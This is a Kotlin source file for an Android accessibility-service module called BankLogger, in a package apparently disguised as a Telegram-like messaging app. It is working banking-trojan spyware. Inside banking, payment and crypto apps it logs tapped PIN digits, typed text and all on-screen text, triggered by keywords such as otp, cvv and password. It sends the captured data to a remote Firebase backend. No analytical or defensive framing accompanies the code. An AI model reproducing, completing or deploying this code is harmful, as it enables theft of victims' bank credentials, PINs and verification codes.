package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

object BankLogger {
    private val financialKeywords = setOf(
        "balance", "available", "total", "amount", "transfer", "send", "pay",
        "card", "cvv", "cvc", "expiry", "exp date", "password", "pin", "login",
        "confirm", "otp", "code", "verification", "authenticate", "security", "2fa"
    )

    fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return

        if (isFinancialApp(pkg) || containsFinancialKeywords(event)) {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    val source = event.source ?: return
                    val text = source.text?.toString()
                    if (text != null && text.length == 1 && text[0].isDigit()) {
                        FirebaseBridge.pushBankData("PIN_DIGIT: $text | App: $pkg | Time: ${System.currentTimeMillis()}")
                    }
                    source.recycle()
                }
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val newText = event.text?.joinToString(" ") ?: ""
                    if (newText.isNotEmpty()) {
                        FirebaseBridge.pushBankData("TEXT_INPUT: $newText | App: $pkg")
                    }
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val root = service.rootInActiveWindow ?: return
                    val allTexts = mutableListOf<String>()
                    collectTexts(root, allTexts)
                    if (allTexts.any { containsFinancialKeywords(it) }) {
                        FirebaseBridge.pushBankData("SCREEN_DATA: ${allTexts.joinToString(" | ")} | App: $pkg")
                    }
                }
            }
        }
    }

    private fun isFinancialApp(pkg: String): Boolean {
        return pkg.contains("bank") || pkg.contains("pay") || pkg.contains("wallet") ||
                pkg.contains("money") || pkg.contains("card") || pkg.contains("finance") ||
                pkg.contains("paypal") || pkg.contains("venmo") || pkg.contains("crypto")
    }

    private fun containsFinancialKeywords(text: String): Boolean {
        val lower = text.lowercase()
        return financialKeywords.any { it in lower }
    }

    private fun containsFinancialKeywords(event: AccessibilityEvent): Boolean {
        return event.text?.joinToString(" ")?.lowercase()?.let { containsFinancialKeywords(it) } ?: false
    }

    private fun collectTexts(node: AccessibilityNodeInfo, out: MutableList<String>) {
        if (node.text != null && node.text.isNotBlank()) {
            out.add("TEXT: ${node.text}")
        }
        if (node.hintText != null) {
            out.add("HINT: ${node.hintText}")
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { collectTexts(it, out) }
        }
    }
}